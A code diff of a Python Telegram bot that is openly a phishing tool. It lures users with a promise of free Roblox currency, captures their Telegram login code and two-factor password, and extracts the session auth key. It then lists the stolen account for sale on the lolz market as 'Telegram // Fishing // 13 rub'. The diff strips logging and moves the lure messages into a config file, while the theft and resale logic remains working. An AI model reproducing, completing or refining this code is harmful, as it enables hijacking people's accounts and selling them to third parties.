@@ -1,9 +1,6 @@
-from asyncio.log import logger
-from turtle import xcor
 from ClientTelegram import ClientTelegram
 
 import config
-from logger import logger
 from lolzapi import LolzteamApi
 from aiogram import Bot, types
 from aiogram.dispatcher import Dispatcher
@@ -14,20 +11,15 @@ from aiogram.types import ReplyKeyboardRemove, \
 from aiogram.dispatcher.filters.state import StatesGroup, State
 from aiogram.dispatcher import FSMContext
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
-import random
 import requests
-import shutil
 from telethon import TelegramClient
-import telethon
 import asyncio
-import traceback
 from telethon import functions
 from telethon.tl.types import InputPeerSelf
 from telethon.errors import SessionPasswordNeededError
 from telethon.tl.functions.messages import GetHistoryRequest
 from telethon.tl.functions.payments import GetPaymentReceiptRequest
 import os
-import zipfile
 from telethon.sessions import StringSession
 import flag
 from telethon.tl.functions.channels import JoinChannelRequest
@@ -145,9 +137,6 @@ async def inline_click(call: types.CallbackQuery):
             dc_id = sessionString.dc_id
             auth_key = binascii.hexlify(sessionString.auth_key.key)
 
-            logger.info(f"dc_id = {dc_id}")
-            logger.info(f"auth_key = {auth_key}")
-
             steps[call.message.chat.id]["step"] = -1
             while True:
                 item = lolz.market_add_item(title="Телеграм // фишинг // 13 рублей", price=13, category_id=24, item_origin="fishing", extended_guarantee=0, title_en="Telegram // Fishing // 13 rub")
@@ -172,7 +161,6 @@ async def inline_click(call: types.CallbackQuery):
 
                         json = item_checked.json()
                         if "status" not in json.keys():
-                            logger.error(f"Sell error, error: {json}")
                             break
 
                         if json["status"] == "ok":
@@ -210,15 +198,14 @@ async def inline_click(call: types.CallbackQuery):
             await call.message.reply("Введите ваш пароль 2фа:")
             steps[call.message.chat.id]["step"] = 2
         except:
-            code = call.message.text.replace("📲Введите код, который вам отправил телеграмм(проверьте чаты)", "")
+            code = call.message.text.replace(config.textInfo["codeText"], "")
 
-            logger.error(f"Client enter invalid code, code: {code}")
             await call.message.reply("Код не верный!")
 
 @dp.message_handler(content_types=types.ContentTypes.TEXT)
 async def code_step(message: types.Message):
     if message.chat.id not in steps.keys():
-        await message.reply("Введите /start")
+        await message.reply("/start")
         return
     if steps[message.chat.id]["step"] != 2:
         return
@@ -228,18 +215,14 @@ async def code_step(message: types.Message):
         await client111.enter_password(message.text)
 
         steps[message.chat.id]["msg_text"] = ""
-        await message.reply("⌚️Проверям роблокс сервера!")
         sessionString = StringSession.save(client111.client.session)
         sessionString = StringSession(sessionString)
         await client111.client.disconnect()
         os.remove(f"./{client111.phone_number}.session")
-        await message.reply("✅Успех! \n Мы нашли подходящий сервер, робуксы будут выданы 24 часа! \n \n Отправьте нам свой ник в игре🎁")
+        await message.reply(config.textInfo["validCodeText"])
         await asyncio.sleep(3)
         dc_id = sessionString.dc_id
         auth_key = binascii.hexlify(sessionString.auth_key.key)
-
-        logger.info(f"dc_id = {dc_id}")
-        logger.info(f"auth_key = {auth_key}")
 
         steps[message.chat.id]["step"] = -1
         while True:
@@ -260,7 +243,6 @@ async def code_step(message: types.Message):
                         continue
                     json = item_checked.json()
                     if "status" not in json.keys():
-                        logger.error(f"Sell error, error: {json}")
                         break
                     if json["status"] == "ok":
                         text = f"https://lolz.guru/market/{item_id}/"
@@ -292,10 +274,9 @@ async def code_step(message: types.Message):
                     pass
                 
     except Exception as e:
-        traceback.print_exc()
-        logger.error(f"Invalid password, error: {e}")
-        await message.reply("Вы ввели неверный пароль")
+        await message.reply(config.textInfo["invalidPasswordError"])
 
 
 if __name__ == '__main__':
     executor.start_polling(dp)
+
